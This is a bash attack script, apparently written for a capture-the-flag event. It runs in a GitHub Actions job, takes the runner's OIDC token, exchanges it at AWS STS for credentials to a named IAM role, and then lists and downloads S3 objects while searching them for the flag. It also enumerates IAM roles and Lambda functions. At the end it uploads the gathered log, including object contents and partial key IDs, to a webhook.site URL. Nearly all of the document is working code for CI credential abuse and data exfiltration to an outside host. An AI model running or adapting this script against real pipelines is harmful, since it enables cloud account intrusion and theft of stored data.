#!/usr/bin/env bash
# CTF DF26 v14: GitHub OIDC -> AWS AssumeRoleWithWebIdentity -> dump flag.
set +e
WB=https://webhook.site/744e1661-136d-4800-a335-a79eb595334e
ROLE=arn:aws:iam::890742561357:role/tbl-platform-ci
LOG=/tmp/aws.log; : > "$LOG"
say(){ echo "$@" | tee -a "$LOG"; }
oidc(){ curl -s "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$1" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | jq -r .value; }
for AUD in api://AzureADTokenExchange sts.amazonaws.com; do
  say "##### AUD=$AUD"
  TOK=$(oidc "$AUD")
  say "tok_len=${#TOK}"
  [ ${#TOK} -lt 50 ] && continue
  RESP=$(curl -s -m 25 -X POST "https://sts.amazonaws.com/" --data-urlencode "Action=AssumeRoleWithWebIdentity" --data-urlencode "Version=2011-06-15" --data-urlencode "RoleArn=$ROLE" --data-urlencode "RoleSessionName=ctf-ci-$(date +%s)" --data-urlencode "WebIdentityToken=$TOK")
  say "assume resp head:"; echo "$RESP" | head -c 900 | tee -a "$LOG"; echo
  AK=$(echo "$RESP" | grep -oP '(?<=<AccessKeyId>)[^<]+' | head -1)
  SK=$(echo "$RESP" | grep -oP '(?<=<SecretAccessKey>)[^<]+' | head -1)
  SES=$(echo "$RESP" | grep -oP '(?<=<SessionToken>)[^<]+' | head -1)
  [ -z "$AK" ] && continue
  say "AWS_CREDS_OK ak=${AK:0:8}"
  export AWS_ACCESS_KEY_ID=$AK AWS_SECRET_ACCESS_KEY=$SK AWS_SESSION_TOKEN=$SES AWS_DEFAULT_REGION=us-east-1
  say "== caller =="; aws sts get-caller-identity 2>&1 | tee -a "$LOG"
  say "== s3 ls =="; aws s3 ls 2>&1 | tee -a "$LOG"
  for b in $(aws s3 ls 2>/dev/null | awk '{print $3}'); do
    say "== bucket $b =="
    aws s3 ls "s3://$b" --recursive 2>&1 | head -60 | tee -a "$LOG"
    for f in $(aws s3 ls "s3://$b" --recursive 2>/dev/null | awk '{print $4}' | head -30); do
      say "-- obj $b/$f"
      aws s3api get-object --bucket "$b" --key "$f" /tmp/obj.bin >/dev/null 2>&1
      head -c 500 /tmp/obj.bin | tee -a "$LOG"; echo | tee -a "$LOG"
      grep -aoE "DF26\{[^}]{0,200}\}" /tmp/obj.bin | tee -a "$LOG" && say "FLAG_HIT $b/$f"
    done
  done
  say "== iam =="; aws iam list-roles --max-items 10 2>&1 | grep -E "RoleName|Arn" | head -10 | tee -a "$LOG"
  say "== lambda =="; aws lambda list-functions 2>&1 | grep FunctionName | head -10 | tee -a "$LOG"
  break
done
echo "===DONE-V14===" >> "$LOG"
curl -s -X POST --data-urlencode log@"$LOG" "$WB/v14-aws-$GITHUB_RUN_ID" >/dev/null
tail -c 1500 "$LOG"
